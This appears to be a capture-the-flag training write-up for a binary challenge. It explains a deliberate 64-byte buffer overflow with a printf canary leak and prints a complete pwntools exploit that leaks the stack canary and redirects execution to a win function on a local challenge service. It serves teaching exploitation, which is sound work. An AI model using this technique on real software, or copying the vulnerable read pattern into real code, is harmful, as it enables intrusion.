# Challenge 02: Stack Overflow with Canary Leak

## Difficulty: Easy-Medium

## Vulnerability Type: Stack Buffer Overflow + Information Leak

## Description
This challenge has stack canaries enabled, but the program has a vulnerability that leaks the canary value through improper string handling.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Enabled
- **RELRO**: Partial

## Vulnerability Analysis

### Leak Vulnerability
```c
read(0, buffer, 80);  // 64-byte buffer, can overflow by 16 bytes
printf("Welcome, %s\n", buffer);  // Prints until null byte
```

If we fill the entire 64-byte buffer without a null terminator, `printf` will continue reading and leak the canary value from the stack.

### Overflow Vulnerability
```c
read(0, buffer, 200);  // Massive overflow
```

The second read allows a large overflow that can overwrite the return address.

## Exploitation Strategy

### Step 1: Leak the Canary
Send exactly 64 bytes to fill the buffer without null terminator:
```python
payload1 = b'A' * 64
p.sendafter(b'name? ', payload1)
leak = p.recvline()
# Extract canary from leaked data
```

### Step 2: Overwrite Return Address with Canary
```python
offset = 64
payload2 = b'A' * offset
payload2 += p64(leaked_canary)  # Preserve canary
payload2 += b'B' * 8            # Saved RBP
payload2 += p64(win_addr)       # Return address
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9002)
else:
    p = process('./challenge')

# Leak canary
p.sendafter(b'name? ', b'A' * 64)
leak = p.recvline()

# Extract canary (after "Welcome, " + 64 A's)
canary_bytes = leak[73:81]  # Adjust based on output
canary = u64(canary_bytes)
log.info(f"Leaked canary: {hex(canary)}")

# Exploit with correct canary
win_addr = elf.symbols['win']
payload = b'A' * 64
payload += p64(canary)
payload += b'B' * 8
payload += p64(win_addr)

p.sendafter(b'message: ', payload)
p.interactive()
```

## Automated Detection
- **Canary Protection**: Detected via checksec
- **Leak Primitive**: Printf of user-controlled buffer without null termination
- **Overflow**: read() with size larger than buffer
- **Strategy**: Leak canary, then perform overflow with correct canary value

## Learning Objectives
- Understanding stack canaries
- Information leak exploitation
- Multi-stage exploitation
- Canary bypass techniques
